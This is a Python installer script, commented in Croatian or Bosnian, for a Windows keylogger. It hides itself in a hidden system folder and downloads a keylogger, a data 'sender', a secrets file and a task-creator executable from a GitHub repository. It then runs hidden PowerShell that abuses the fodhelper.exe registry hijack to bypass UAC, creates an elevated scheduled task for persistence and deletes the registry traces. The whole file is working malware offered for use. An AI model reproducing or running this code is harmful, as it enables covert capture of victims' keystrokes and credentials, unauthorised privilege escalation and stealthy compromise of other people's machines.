import os # za kreiranje foldera i dobijanje filepath-a
import ctypes # za dodavanje atributa folderu
import shutil # za premjestanje datoteke u skriveni folder
import subprocess # za pokretanje powershell koda iz pythona
import sys

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

class Inicijalizacija:
##########################################################################################################################################################################
    def moveFile(self):
        folder_path = "C:\\skriveni_folder"
        
        if not os.path.exists(folder_path): # Provjera postoji li folder da ne kreira duplikate
            os.makedirs(folder_path)
            
            attributes = 0x02 | 0x04        # 0x02 označava HIDDEN atribut a 0x04 označava SYSTEM atribut

            ctypes.windll.kernel32.SetFileAttributesW(folder_path, attributes)
            print(f"Folder je uspješno kreiran")
        else:
            print(f"Folder već postoji.")
        
        # Premještanje trenutnog Python fajla u skriveni folder
        current_file = os.path.abspath(__file__) # Puna putanja do trenutne lokacije datoteke
        destination = "C:\\skriveni_folder\\Inicijalizator.pyw" # Puna putanja do destinacije
        
        shutil.move(current_file, destination)
        print(f"File je premješten u skriveni folder.")

##########################################################################################################################################################################

    def downloadTaskKreator(self):
        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/task%20kreator.exe" # url lokacije datoteke koja kreira task
        response = requests.get(url)

        if response.status_code == 200:
            with open("c:\\skriveni_folder\\task kreator.exe", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
                file.write(response.content)
            print(f"File je uspješno preuzet.")
        else:
            print("Pogreška prilikom preuzimanja.")

##########################################################################################################################################################################

    def downloadKeylogger(self):
        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/Keylogger.pyw" # url lokacije datoteke koja kreira task
        response = requests.get(url)

        if response.status_code == 200:
            with open("c:\\skriveni_folder\\Keylogger.pyw", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
                file.write(response.content)
            print(f"File je uspješno preuzet.")
        else:
            print("Pogreška prilikom preuzimanja.")

##########################################################################################################################################################################

    def downloadSender(self):
        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/sender.pyw" # url lokacije datoteke koja kreira task
        response = requests.get(url)

        if response.status_code == 200:
            with open("c:\\skriveni_folder\\sender.pyw", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
                file.write(response.content)
            print(f"File je uspješno preuzet.")
        else:
            print("Pogreška prilikom preuzimanja.")

##########################################################################################################################################################################

    def downloadTajna(self):
        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/jako_safe_nacin_za_distribuiranje_tajni.json" # url lokacije datoteke koja kreira task
        response = requests.get(url)

        if response.status_code == 200:
            with open("c:\\skriveni_folder\\jako_safe_nacin_za_distribuiranje_tajni.json", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
                file.write(response.content)
            print(f"File je uspješno preuzet.")
        else:
            print("Pogreška prilikom preuzimanja.")

##########################################################################################################################################################################

    def createTask(self):
        powershell_script = r"""
        Param ([String]$program = '"c:\skriveni_folder\task kreator.exe"')  # Zaseban file napisan u c++ koji služi za UAC bypass prilikom kreiranja scheduled
                                                                            # taska sa eleviranim privilegijama, ovo je nažalost najbolje što sam smislio / našao

        New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
    　
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden # fodhelper.exe je windows program koji ima sigurnosni propust koji dopušta
                                                                              # pokretanje programa s eleviranim privilegijama bez User Account Control prozora
        
        Start-Sleep 3
        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force     # Brisanje registry itema nakon što su iskorišteni za fodhelper.exe sigurnosni propust
        """
        subprocess.call(["powershell.exe", "-WindowStyle", "Hidden", "-Command", powershell_script])    # Poziv powershell skripte

##########################################################################################################################################################################

# Kreiranje instance klase i poziv metoda
inicijalizacija = Inicijalizacija()
inicijalizacija.moveFile()
inicijalizacija.downloadKeylogger()
inicijalizacija.downloadTaskKreator()
inicijalizacija.downloadSender()
inicijalizacija.downloadTajna()
inicijalizacija.createTask()